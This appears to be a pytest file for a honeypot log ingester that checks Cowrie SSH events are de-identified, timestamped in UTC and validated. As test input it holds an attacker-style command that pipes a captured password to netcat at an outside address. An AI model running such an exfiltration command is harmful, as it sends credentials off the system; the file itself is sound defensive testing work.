import json
from datetime import UTC, datetime

import pytest

from vulnmaze.common.deid import REDACTED, SRC_IP_TOKEN
from vulnmaze.ingest.normalize import SessionSecrets, event_hash, normalise, parse_ts
from vulnmaze.ingest.public import _rewrite


def _norm(event, deid, secrets):
    """Normalise one event dict as the ingester would."""
    return normalise(event, json.dumps(event), deid, secrets)


def test_login_and_command_are_deidentified(deid):
    """Raw IPs and passwords never reach the row, and later commands are scrubbed of both."""
    secrets = SessionSecrets()
    login = _norm({"eventid": "cowrie.login.success", "session": "s1", "timestamp": "2026-10-01T00:00:00Z",
                   "src_ip": "198.51.100.9", "username": "root", "password": "hunter22",
                   "message": "login attempt [root/hunter22] succeeded"}, deid, secrets)
    cmd = _norm({"eventid": "cowrie.command.input", "session": "s1", "timestamp": "2026-10-01T00:00:05Z",
                 "input": "echo hunter22 | nc 198.51.100.9 80"}, deid, secrets)
    stored = json.dumps([login.data, cmd.data, cmd.input, login.src_ip_hmac])
    assert "198.51.100.9" not in stored and "hunter22" not in stored
    assert login.password_hmac == deid.secret("hunter22") and login.password_len == 8
    assert login.src_prefix == "198.51.0.0/16"
    assert cmd.input == f"echo {REDACTED} | nc {SRC_IP_TOKEN} 80"
    assert cmd.src_ip_hmac == login.src_ip_hmac


def test_event_without_session_is_rejected(deid):
    """Events missing eventid or session raise instead of being stored half-empty."""
    with pytest.raises(ValueError):
        _norm({"eventid": "cowrie.session.connect", "timestamp": "2026-10-01T00:00:00Z"}, deid, SessionSecrets())


def test_timestamps_are_always_utc():
    """ISO strings with Z, naive strings and epoch numbers all become aware UTC datetimes."""
    expected = datetime(2026, 10, 1, tzinfo=UTC)
    assert parse_ts({"timestamp": "2026-10-01T00:00:00Z"}) == expected
    assert parse_ts({"timestamp": "2026-10-01T00:00:00.123456Z"}).microsecond == 123456
    assert parse_ts({"timestamp": "2026-10-01T08:00:00+08:00"}) == expected
    assert parse_ts({"timestamp": "2026-10-01T00:00:00"}) == expected
    assert parse_ts({"time": expected.timestamp()}) == expected
    assert parse_ts({"timestamp": 0}).year == 1970


def test_a_recorded_session_holds_no_raw_ip_or_password(fixtures, deid):
    """The whole recorded session, normalised end to end, leaks no address or credential."""
    secrets: dict[str, SessionSecrets] = {}
    rows = []
    for line in (fixtures / "cowrie_session_basic.jsonl").read_text().splitlines():
        event = json.loads(line)
        rows.append(normalise(event, line, deid, secrets.setdefault(event["session"], SessionSecrets())))
    blob = json.dumps([r.as_dict() for r in rows])
    assert "203.0.113.7" not in blob
    assert "192.0.2.10" not in blob  # our own sensor address
    assert "S3cretPass!" not in blob
    # the password echoed inside a command was scrubbed, not dropped
    chpasswd = next(r for r in rows if r.eventid == "cowrie.command.input" and r.input and "chpasswd" in r.input)
    assert REDACTED in chpasswd.input
    login = next(r for r in rows if r.eventid == "cowrie.login.success")
    assert login.password_hmac == deid.secret("S3cretPass!")
    assert login.password_len == len("S3cretPass!")


def test_event_hash_ignores_surrounding_whitespace():
    """Re-reading the same line with a trailing newline gives the same idempotency key."""
    assert event_hash('{"a":1}\n') == event_hash('{"a":1}')


@pytest.mark.parametrize("extra", [
    {"eventid": "cowrie.command.input", "input": "uname -a"},
    {"eventid": "cowrie.client.version", "version": "SSH-2.0-Go" + chr(0), "kexAlgs": ["curve25519" + chr(0)]},
])
def test_cow160x4_line_loads_without_location_or_nulls(deid, extra):
    """A COW160x4 line maps `ts` to the timestamp and drops geoip fields, null columns and NUL characters."""
    rec = {"ts": "2025-06-27 23:09:32.754745", "session": "s1", "src_ip": "1a2b3c4d", "password": None,
           "src_ip_geoip_city_name": "Amsterdam", "honeypot_ip_geoip_location": "1.3,103.7", "url": None, **extra}
    line = next(_rewrite(rec))
    row = normalise(json.loads(line), line, deid, SessionSecrets())
    assert row.ts == datetime(2025, 6, 27, 23, 9, 32, 754745, tzinfo=UTC)
    assert not any("geoip" in k or v is None for k, v in row.data.items())
    assert "u0000" not in json.dumps([row.data, row.input])


@pytest.mark.parametrize("rec", [{"session": "s1", "eventid": "cowrie.command.input"},
                                 {"ts": None, "session": "s1", "eventid": "cowrie.command.input"}])
def test_cow160x4_line_without_timestamp_is_rejected(deid, rec):
    """A line with no usable timestamp raises instead of being stored."""
    line = next(_rewrite(rec))
    with pytest.raises(ValueError):
        normalise(json.loads(line), line, deid, SessionSecrets())
